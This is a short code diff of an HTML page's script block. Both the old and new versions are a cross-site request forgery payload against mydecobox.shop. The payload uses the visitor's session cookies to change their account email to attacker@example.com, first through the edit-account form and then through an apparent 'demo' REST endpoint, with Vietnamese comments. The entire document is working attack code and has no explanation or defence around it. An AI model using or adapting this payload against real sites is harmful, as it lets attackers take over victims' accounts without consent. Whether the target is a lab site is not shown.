@@ -2972,23 +2972,22 @@
       data-wp-strategy="defer"
     ></script>
     <script>
-      fetch("https://mydecobox.shop/my-account/edit-account/", {
+      fetch("https://mydecobox.shop/wp-json/demo/v1/change-email", {
         method: "POST",
-        credentials: "include", // bắt browser gửi cả cookie session
-        headers: { "Content-Type": "application/x-www-form-urlencoded" },
-        body: new URLSearchParams({
-          account_first_name: "Nguyễn",
-          account_last_name: "Văn A",
-          account_display_name: "lacnhuwork",
-          account_email: "attacker@example.com",
-          save_account_details: "Save changes",
-          _wp_http_referer: "/my-account/edit-account/",
-        }),
-      }).then(
-        (r) =>
-          (window.location =
-            "https://mydecobox.shop/my-account/edit-account/?done")
-      );
+        credentials: "include", // gửi kèm cookie session
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email: "attacker@example.com" }),
+      })
+        .then((r) => r.json())
+        .then((data) => {
+          if (data.success) {
+            alert("Email đã bị thay thành: " + data.new_email);
+            // Chuyển về trang account để nhìn thấy thay đổi
+            window.location = "https://mydecobox.shop/my-account/edit-account/";
+          } else {
+            console.error("Không thành công", data);
+          }
+        });
     </script>
   </body>
 </html>
